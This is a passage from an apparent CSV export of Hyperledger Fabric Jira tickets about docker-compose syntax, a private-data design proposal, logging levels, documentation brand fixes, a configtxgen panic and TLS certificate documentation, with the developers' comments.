tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Invalid syntax in docker compose files,FAB-5130,18862,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,nnao,chris.elder,chris.elder,30/Jun/17 11:28 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,05/Aug/17 8:35 PM,v1.0.0,,,v1.0.1,,fabric-samples,,,,,,0,,,,,,,"Two docker compose files have an invalid syntax in the CouchDB section.

These are the two files concerned:

fabric-samples/fabcar/network/docker-compose.yml

fabric-samples/basic-network/docker-compose.yml

This is the line concerned:

environment:
   DB_URL: [http://localhost:5984/member_db]

It should be:

environment:
    -DB_URL=[http://localhost:5984/member_db]

It is odd that it does seem to cause a problem. 

The defect is being opened since it prevents adding additional environment variables to the CouchDB container.   Additional variables need to be added in order to activate the CouchDB username and password.

Also, it needs to be assessed in the DB_URL is required.  It is not used by Ledger, but I am not sure if it is being used by another part of the sample code.

 

 

 ",,chris.elder,denyeart,nnao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6k7:",,,,,,,,,,,,,,,,,,,,,,,chris.elder,denyeart,nnao,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"06/Jul/17 1:53 PM;nnao;https://gerrit.hyperledger.org/r/#/c/11409/;;;","26/Jul/17 2:42 AM;denyeart;I confirmed that this environment variable is not needed and in fact adds no value.

Note that the only occurrence is in basic-network now.

[~mastersingh24] Let's get this one merged for 1.0.1.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Supporting private data in Hyperledger,FAB-5131,18863,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,shaih,tzipih0,tzipih0,01/Jul/17 12:46 AM,18/Aug/19 8:47 PM,28/Oct/23 3:00 AM,18/Aug/19 8:47 PM,,,,,,fabric-peer,,,,,,5,chaincode,Ledger,Security,,,,"We would like to support in Hyperledger private data that is visible to some peers but not others, and moreover support transactions that are based on such private data. We propose below a modest change to the current architecture that opens the door  to a wide range of advanced applications, including multi-party computation and other cryptographic solutions.

Design:

Design Document

[Supporting private data in Hyperledger|http://docs.google.com/document/d/16SYkK_wxReCeAEXbgobP6B8vW-VTGNQ_qRmJemS_jTI/edit?usp=sharing]

 

 ",,baohua,chrispoole,DrVadson,fbenhamo,fredbi,gennadyl,Hangyu_FJH,ianj_mitchell@uk.ibm.com,jiangyaoguo,luomin,mastersingh24,mne,pumicerD,qizhang87,RahulEth,shaih,smartheye,sujeeban,tzipih0,vvnick,wutongtree,xixuejia,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Jul/17 12:44 AM;tzipih0;Hyperledger proposal - Supporting Private Data.pdf;https://jira.hyperledger.org/secure/attachment/11528/Hyperledger+proposal+-+Supporting+Private+Data.pdf",,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy6kf:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,chrispoole,DrVadson,fbenhamo,fredbi,gennadyl,Hangyu_FJH,ianj_mitchell@uk.ibm.com,jiangyaoguo,luomin,mastersingh24,mne,pumicerD,qizhang87,RahulEth,shaih,smartheye,sujeeban,tzipih0,vvnick,wutongtree,xixuejia,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Jul/17 8:48 PM;ianj_mitchell@uk.ibm.com;I'm interested in this idea since the scenarios you describe also work when the idea is to interact with an existing System of Record as part of the endorsement logic.

Have you seen the Composer feature (currently experimental) to allow [calls to external REST services|https://hyperledger.github.io/composer/integrating/call-out.html]?

That is leaning on the fact that unless you try to store data from an external call in the transaction (which will then fall foul of non-determinism), getting an opinion from an external service about whether to endorse or not should be OK (their section on ""Idempotency and Consenus"" covers some of this).

I don't think Composer has solved the problem of different endorsers all making the same service request and having some local variation in the service provider (ie is it intended that they all ask the same common service instance the same question, or should the service call resolve to a locally-specified service instance not shared with other endorsers?).

So you're idea for local configuration is interesting - it would allow different peers to rely on local config to make such requests with more explicit config.

I think the idea of local peer variation for endorsement logic execution is actually separable from the notion that there is some local data stored uniquely in the DB of the peer.;;;","05/Jul/17 8:57 PM;ianj_mitchell@uk.ibm.com;(I also suggested an update to your google doc - the link to this item wasn't complete.);;;","05/Jul/17 10:01 PM;ianj_mitchell@uk.ibm.com;OK... I'm missing something fundamental here (perhaps it's hidden in the description of the demo which I've not fully digested yet). You want to hide some information from some of the endorsers (all except one in the extreme case) by relying on encryption to keep it from the excluded peers. So this has to arrive in a transaction from the client... it can't be injected during the execution of the endorsement logic - so there's a coupling of the encryption between the client and the included peer(s), and the chain code needs to tolerate that data that it's local config does not provide the keys to decrypt should be just passed through (ignored).

Is that correct?

As you say, local config could provide more than just keys to this data - you mention the possibility I'm interested in ('tokens for access to an external resource or API'). ;;;","06/Jul/17 3:19 PM;baohua;One interesting question is how to share the keys between those should access the data? e.g., client gives keys to the chaincode and peer beforehand?

Thanks!;;;","06/Jul/17 6:11 PM;ianj_mitchell@uk.ibm.com;[~baohua] - yes, that's what I meant when I said about the coupling of the encryption between the client and the included peers.

If I'm getting the hang of this, then also won't the data be read-only to the endorsing code in the permitted peers (since the excluded peers can do nothing with it), so the permitted peers just need a public key in order to look at the data? Oh... or am I getting the public/private keys the wrong way round?;;;","06/Jul/17 6:46 PM;ianj_mitchell@uk.ibm.com;Have you considered whether the privacy scope is better associated with an organisation than the infrastructure elements such as peers? (I've not got the relationship between orgs and channels straight enough in my head to answer that with confidence myself.);;;","07/Jul/17 12:56 AM;ianj_mitchell@uk.ibm.com;I've realised I've not fully absorbed the peer communication piece of this properly - have to read more fully.;;;","13/Jul/17 12:09 AM;tzipih0;[~ianj_mitchell@uk.ibm.com] - concerning the privacy scope, we agree that it might better be associated with an organisation rather than peers. Maybe the two options should be given.

[~ianj_mitchell@uk.ibm.com] and [~baohua] - concerning keys: there should indeed be a way to populate the local configuration and write into it the keys. The chaincode cannot write directly to the local configuration with our current proposal.

[~ianj_mitchell@uk.ibm.com] - the private key is used to decrypt data, while the public key is used to encrypt data. So the client might only have the public key, but the peer really needs to have the private key, as it needs to decrypt data from the ledger.;;;","25/Oct/17 8:46 PM;fredbi;Hello.

I've read the document (but not the code) and you get many strong points.

There are however some assumptions that require an advanced knowledge of the current status of hyperledger.

It might be worth clarifying some of these points.

Overall, a highly required feature in my opinion: nice work, thumbs up.
h2. Assumptions/Assertions where clarification might be needed

_- P.2 ""The current Hyperledger Fabric architecture has some limited support for private data, but it is not nearly enough for applications such as above. For example, private channels can only be used for a complete partition of the data, where access to the data on a given channel is all-or-nothing. Moreover, hiding data in a private channel means that it cannot be a part of any transaction on any other channel.""_

I understand the idea about private channels. For permissioned channels, mixing peers vs channel is, in my understanding, misleading. In the current (v1.0.3) setup, I assume it is possible for a chaincode to exist on a channel where only some peers have acces to it, while other participants to the channel (which are not peers for this chaincode) cannot have access to its state and tx.

Example: let us-channel be a channel for all US corporations. Let ibm-sales a CC with peers peer 0 [org: IBM Corp] and 3 others from 3 distinct organizations (org1, org2, org3). My assumption is that peers from another organization on the same channel (say Microsoft) may be barred from deploying this chaincode and cannot query/invoke ibm-sales CC.

P.2 ""_To support private data, some of the information on the ledger is kept in an encrypted form, under keys that are only available to those peers that are allowed to see it._""

The setup is not clear from what follows. I understand that ""decryption keys"" (shared secret key?) are stored there, but nothing is told about how ""state variable keys"" are referred to.

An additional note: when using couchdb as a JSON store, state variable keys are mapped to documents. There is however a difference when data type is not JSON (which I suppose, is the natural outcome of the data encryption process): values are stored in couchdb as attachment to a (stub) document. This means that the document db has not the same structure for all peers. peers with crypted documents should restrain to attempt rich-queries which would fail.

Conducting experiments with JSON data should help clarifying this behavior.

P.4 ""_To be able to handle data that is only visible to some peers but not others, the endorsement process must allow communication between peers_""

Current transaction workflow isolates peers from each other: endorsing peers take their decisions independently, other peers just apply endorsed decisions after ordering by an independant ordering service.

It doesn't appear clearly in the doc why endorsing peers must communicate directly (maybe it is in the code): after all, the outcome of endorsement is just a signature. I understand that the outcome of one's peer simulation on encrypted bits must be broadcast to other endorsing peers then merged so all of them may converge to the same state before ordering.

Could this be clarified?

 

§ Appendix: ""uses homomorphic encryption""

Question: I understand the need for ZK proof in the protocol established between endorsing peers. However, no precision is given regarding the encryption of data themselves. Could this encryption be designed as pluggable? An interesting use-case could be to use attribute based encryption so that no secret needs to be shared between peers.
h2. Strong points - but separate concern (=> could be split in shorter stories and prioritized differently)

*local conf for CC*:  as well state, it is a highly desirable feature, not necessarily related to privacy.

*GetPeerId():* in other words, ""who am I"". This extension proposal is indeed much needed, and is not specific to private date.

My understanding: this function would prove very useful to implement ""oracles"": an oracle is a peer with access to an external interface. Among endorsement peers, not all of them may implement this interface: it is therefore important that the endorsement logics may differ according to peers.

Other example: distinct legal/business check duties. If several endorsement peers have distinct validation requirements, it is important that the chaincode is able to reproduce this split of responsibilities. Hence, GetPeerId().

 

 ;;;","26/Oct/17 5:16 AM;shaih;Hi Frédéric, thanks for the detailed comment. Here is my take on things:
h3. *Are channels really all-or-nothing*

My understanding of channels is that they are all-or-nothing, i.e. if a peer belongs to some channel then that peer can see every variable on that channel. If this is incorrect (i.e., you can restrict some variables on a channel to only a subset of the peers) then we may be able to use that facility also for the type of transactions that we want to support in this proposal. (Of course, we would still need to implement the protocols themselves, which would still require the two changes in the current proposal.)
h4. *Decryption keys*

Keys are *not* stored on the ledger, and are *not* shared between the peers. These are cryptographic encryption/decryption keys, where each peer has access only to its own keys. (The mechanisms for key management are out of scope for this proposal, but likely we will use the same mechanisms that are now used for signature keys and other credentials.) When a peer is running, these keys are loaded into some local store. A chain-code running on this peer then uses the GetLocalConf(...) interface that we propose here to access these keys.
h4. *Inter-peer communication during endorsement*

This is a crucial point, so let me try to clarify with a simple example. Imagine a transaction that depends on variable X that only peer1 is allowed to see and variable Y that only peer2 is allowed to sees, where the transaction should only take place if X>Y. No peer separately has enough information to make the determination if the transaction should be endorsed or not, so communication between these peers is required.

There is an extra complication that comes from the fact that none of them can communicate its value to the other in cleartext form, this is where we use the crypto-magic that lets you compute on values without revealing them in the clear. But this aspect is orthogonal to the current proposal (and does not require any changes to the fabric), the only changes we need it the ability to communicate and to access the encryption keys.
h4. *Homomorphic encryption*

I didn't understand this comment

 ;;;","18/Aug/19 8:47 PM;mastersingh24;This was implemented via the private data feature starting in v1.2.x;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,
Logging: Setting MSP component logging level fails to stop some incorrect-level logs ,FAB-5134,18868,,Bug,Closed,FAB,Fabric,software,denyeart,,,Lowest,Done,wlahti,AdnanChoudhury,AdnanChoudhury,01/Jul/17 3:54 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,07/Nov/17 2:02 AM,v1.0.0-rc1,,,,,fabric-peer,,,,,,0,,,,,,,"If the msp logging level is set to ERROR/CRITICAL via a docker environment variable, the peer log still contains  WARN level logging from MSP.

+*Setup:*
+bring-your-first-network from fabric-sample. Added these two lines in the peer-base.yaml (so all peer containers will have these)
{code:java}
- CORE_LOGGING_LEVEL=ERROR
 - CORE_LOGGING_LEDGER=WARNING
 - CORE_LOGGING_MSP=ERROR{code}
 +*Expected:*+
No logs for msp if its lower than ERROR.
+*Observed:*+
all peers have 3 WARN level logs and 1 INFO level log:
{code:java}
{""log"":""\u001b[33m2017-06-29 21:53:33.523 UTC [msp] getMspConfig -\u003e WARN 001\u001b[0m Intermediate certs folder not found at [/etc/hyperledger/fabric/msp/intermediatecerts]. Skipping. [stat /etc/hyperledger/fabric/msp/intermediatecerts: no such file or directory]\n"",""stream"":""stderr"",""time"":""2017-06-29T21:53:33.523640743Z""}
{""log"":""\u001b[33m2017-06-29 21:53:33.523 UTC [msp] getMspConfig -\u003e WARN 002\u001b[0m TLS intermediate certs folder not found at [/etc/hyperledger/fabric/msp/tlsintermediatecerts]. Skipping. [stat /etc/hyperledger/fabric/msp/tlsintermediatecerts: no such file or directory]\n"",""stream"":""stderr"",""time"":""2017-06-29T21:53:33.523676862Z""}
{""log"":""\u001b[33m2017-06-29 21:53:33.523 UTC [msp] getMspConfig -\u003e WARN 003\u001b[0m crls folder not found at [/etc/hyperledger/fabric/msp/crls]. Skipping. [stat /etc/hyperledger/fabric/msp/crls: no such file or directory]\n"",""stream"":""stderr"",""time"":""2017-06-29T21:53:33.523681098Z""}
{""log"":""2017-06-29 21:53:33.523 UTC [msp] getMspConfig -\u003e INFO 004\u001b[0m MSP configuration file not found at [/etc/hyperledger/fabric/msp/config.yaml]: [stat /etc/hyperledger/fabric/msp/config.yaml: no such file or directory]\n"",""stream"":""stderr"",""time"":""2017-06-29T21:53:33.523684033Z""}{code}
+*More info*+
Tested with RC1. If I set CORE_LOGGING_MSP=INFO it prints all logs info and up. These logs are at the very beginning.

The likely reason behind this was mentioned in FAB-4931. From [~wlahti]: "".... this is just a side effect of the order that the packages are loaded. At the time the MSP code is running at the very start of the peer, the log level specifications from the environment variables/core.yaml haven't been applied.""",,AdnanChoudhury,jeffgarratt,muralisr,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6kv:",,,,,,,,,,,,,,,,,,,,,,,AdnanChoudhury,jeffgarratt,muralisr,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Sep/17 5:15 AM;muralisr;[~wlahti] can you comment on this (working as designed ?) please ?;;;","27/Oct/17 4:51 AM;jeffgarratt;[~wlahti] assigned to you.  Le me know if this is still an issue.;;;","07/Nov/17 12:10 AM;wlahti;I'll take another look to see if there's any way to not log the messages referred to above. ;;;","07/Nov/17 2:02 AM;wlahti;I no longer see any unexpected log messages using v1.1 code due to libraries loading before the logging levels are set. Closing this item. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
FAQ does not meet brand guidelines,FAB-5139,18873,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,mastersingh24,tkuhrt,tkuhrt,01/Jul/17 7:09 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,06/Jul/17 4:29 AM,,,,v1.0.0,,fabric-docs,,,,,,0,Documentation,v1.0,,,,,"[http://hyperledger-fabric.readthedocs.io/en/latest/Fabric-FAQ.html:] has many violations of the Hyperledger Brand Guidelines ([https://www.hyperledger.org/trademark-usage).] Specifically, I saw a lot of violations of:
 * When referring to a specific Hyperledger software project, *do* use the full project name (e.g., “Acme uses Hyperledger Iroha”) and *do* refer to it as a “framework” or a “tool,” as appropriate (e.g., “the Hyperledger Iroha framework”, “the Hyperledger Explorer tool”).

In many cases, the phrase ""the fabric"" or just ""Fabric"" was used.",,ChristopherFerris,JonathanLevi,mastersingh24,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6lj:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,JonathanLevi,mastersingh24,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"01/Jul/17 8:38 AM;ChristopherFerris;https://gerrit.hyperledger.org/r/11327;;;","02/Jul/17 12:41 AM;mastersingh24;[~tkuhrt] - can you verify and close this if all is good?;;;","04/Jul/17 1:54 AM;tkuhrt;[~ChristopherFerris], [~mastersingh24]: How do we re-open this bug?

I found the following that does not meet Brand Guidelines:

??Does its Membership Service make +Fabric+ a centralized solution???;;;","04/Jul/17 6:37 AM;JonathanLevi;(re-opened at [~tkuhrt] 's behest);;;","04/Jul/17 9:32 PM;mastersingh24;The issue is in the membership services Q&A and frankly it's wrong anyway.  I'll take a look;;;","04/Jul/17 11:52 PM;mastersingh24;https://gerrit.hyperledger.org/r/11355;;;","05/Jul/17 8:34 PM;mastersingh24;[~tkuhrt] - I attempted to update all references to ""Fabric, fabric"" and change them to Hyperledger Fabric.   I also updated any Composer references to Hyperledger Composer

Is it ok to close this one now?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix comment messages in Makefile,FAB-5140,18874,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,yuki-kon,yuki-kon,yuki-kon,01/Jul/17 7:34 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,04/Jul/17 2:22 AM,v1.0.0-rc1,,,v1.0.0,,fabric-peer,,,,,,0,,,,,,,"Comment messages in Makefile is not updated after merging CR10413 ([https://gerrit.hyperledger.org/r/#/c/10413/]).

The following commands don't work as comment suggests.

 - dist-clean

- clean-all

 

We need to update comment messages correctly.",fabric: commit ace2a64b94852bae2219261531b96ef1dff474e6,yuki-kon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6lr:",,,,,,,,,,,,,,,,,,,,,,,yuki-kon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"01/Jul/17 8:08 AM;yuki-kon;Submitted here. https://gerrit.hyperledger.org/r/#/c/11325/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
configtxgen --version should not panic if no config found,FAB-5141,18875,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,01/Jul/17 5:37 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,02/Jul/17 7:28 PM,v1.0.0-rc1,,,v1.0.0,,fabric-tools,,,,,,0,,,,,,,"
{noformat}
Garis-MBP:~ gsingh$ ~/Projects/golang/src/github.com/hyperledger/fabric/release/darwin-amd64/bin/configtxgen --version
2017-07-01 04:35:40.616 EDT [common/configtx/tool] main -> INFO 001 Loading configuration
2017-07-01 04:35:40.617 EDT [common/configtx/tool/localconfig] Load -> CRIT 002 Error reading configuration:  Unsupported Config Type """"
panic: Error reading configuration: Unsupported Config Type """"

goroutine 1 [running]:
panic(0x4dbd60, 0xc4201f31e0)
	/usr/local/go/src/runtime/panic.go:500 +0x1a1
github.com/hyperledger/fabric/vendor/github.com/op/go-logging.(*Logger).Panic(0xc4201fe5d0, 0xc42021e960, 0x2, 0x2)
	/Users/gsingh/Projects/golang/src/github.com/hyperledger/fabric/vendor/github.com/op/go-logging/logger.go:188 +0xd0
github.com/hyperledger/fabric/common/configtx/tool/localconfig.Load(0x5ba429, 0x12, 0x0)
	/Users/gsingh/Projects/golang/src/github.com/hyperledger/fabric/common/configtx/tool/localconfig/config.go:180 +0xa8e
main.main()
	/Users/gsingh/Projects/golang/src/github.com/hyperledger/fabric/common/configtx/tool/configtxgen/main.go:354 +0x537
{noformat}

",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6lz:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"01/Jul/17 6:55 PM;mastersingh24;https://gerrit.hyperledger.org/r/11331;;;","01/Jul/17 6:56 PM;mastersingh24;I'm fine if we defer this, but seemed like a small risk with a good-sized reward for users;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Chaincode for developers tutorial should not require libtool / pkcs#11,FAB-5145,18880,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,02/Jul/17 4:43 AM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,09/Jul/17 5:55 PM,v1.0.0-rc1,,,v1.0.0,,fabric-docs,,,,,,0,,,,,,,"While it is implied that you should install the prereqs and clone the fabric source, you really should not need to do this for building chaincode.  We can eliminate the need for libtool by adding the documenting the use of the
{noformat}
--tags nopkcs11{noformat}
build option.  We should also document the users can do a
{noformat}
go get{noformat} to get the shim package",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,900,900,,0%,900,900,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy6mn:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"09/Jul/17 5:55 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/11335/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
examples/cluster client.config incomplete,FAB-5146,18881,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,mrkiouak,mrkiouak,02/Jul/17 8:38 AM,23/Jan/20 6:53 AM,28/Oct/23 3:00 AM,23/Jan/20 6:53 AM,,,,,,fabric-samples,,,,,,0,security,Security,stale-item,,,,"After the merge of -------FAB-4626--- ([FAB4904])-- the client.config emitted by examples/cluster s incomplete for the needs of a well functioning client.

Based on  -----FAB-4626----- a few interpretations of the appropriate output are possible. Towards providing a robust example suitable for a non development environment, the proposal is to:

*Emit a ca certificate and TLS certificate block.*

Towards this effort, unlike the e2e test suite, example clusters ought to use *a set of certs for fabric interaction* and *a separate set of certs, with separate root, for TLS*.",,JonathanLevi,mrkiouak,sykesm,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-4626,,,,,,,,,,,,,,,,,,,,FAB-5147,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy6mv:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,JonathanLevi,mrkiouak,sykesm,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 6:53 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"[SECURITY] Explicit (OpenSSL compatible) specification for the TLS certs used - organization, structure, fields",FAB-5147,18882,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mrkiouak,mrkiouak,mrkiouak,02/Jul/17 9:08 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,01/Nov/17 11:40 PM,v1.0.0-rc1,,,,,fabric-peer,fabric-quality,,,,,0,"security,","Security,",won't-fix,,,,"The fabric/examples/cluster organization structure (found in config/configtx.yaml) demonstrates example working organization definitions for fabric certificate generation.

This example is no longer a full example of a production-like deployment, as it does not include similar definitions for tls issucing cert organizations.

In lieu of a working example config that then generates via cryptogen or openssl the appropriate tls certs, the example should include, as part of the 'make compose-up' step, a full specification, with examples, of the required tls certificates.

Note: support for FQDN vs comman name in name field is an example of the type of question that does not appear to be addressed in any doc or code specification of tls certs",,jeffgarratt,JonathanLevi,mastersingh24,mrkiouak,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-4546,,,,,,,,,,,,,,,,FAB-5146,FAB-4626,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6n3:",,,,,,,,,,,,,,,,,,,,,,,jeffgarratt,JonathanLevi,mastersingh24,mrkiouak,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Aug/17 9:10 PM;mastersingh24;[~mrkiouak]  - I'm not quite sure what you are asking for here?  Are you asking for a deeper explanation of what's actually happening in terms of how the TLS certificates are generated?    Are you also saying that we need to add to the docs (in general) some basic explanations of how TLS works (e.g. hostname verification, etc)?  

 ;;;","08/Sep/17 3:05 AM;muralisr;[~mrkiouak] any update on this ? Assigning it to you for response to [~mastersingh24] question above.;;;","27/Oct/17 4:19 AM;jeffgarratt;[~mrkiouak] [~muralisr] Plan to close this early next week.  Please advise if still an issue.;;;","01/Nov/17 11:40 PM;jeffgarratt;Gonna close.  Reopen if necessary.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Extraneous docs still found via search,FAB-5149,18884,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,02/Jul/17 7:27 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Jul/17 2:12 AM,v1.0.0-rc1,,,v1.0.0,,fabric-docs,,,,,,0,,,,,,,There are still a few WIP / coming soon docs in the repo which show up if you run a search.,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6nj:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"02/Jul/17 7:30 PM;mastersingh24;https://gerrit.hyperledger.org/r/11337;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
clean up reported error on install,FAB-5150,18885,18703,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,muralisr,muralisr,muralisr,03/Jul/17 4:46 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,04/Jul/17 11:35 PM,v1.0.0-rc1,,,,,,,,,,,0,,,,,,,Reported error contains binary data which should be removed to help SDK reporting.,,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,FAB-5026,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6nr:",,,,,,,,,,,,,,,,,,,,,,,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Inconsistent behaviour when opening files in MSP when installing chaincode,FAB-5152,18894,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,reubent 1,reubent 1,03/Jul/17 8:02 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,24/Jan/18 7:00 AM,,,,v1.1.0,,fabric-peer,,,,,,0,,,,,,,"When installing chaincode, I receive the error ""Error when setting up MSP from directory /etc/hyperledger/fabric/msp: err KeyMaterial not found in SigningIdentityInfo"".

Having run the process through strace, I can see there's an inconsistency in how the keystore path is set compared to the other files in the MSP. I'm unsure which of these is correct but it probably ought to be consistent.

I ran the command
{noformat}
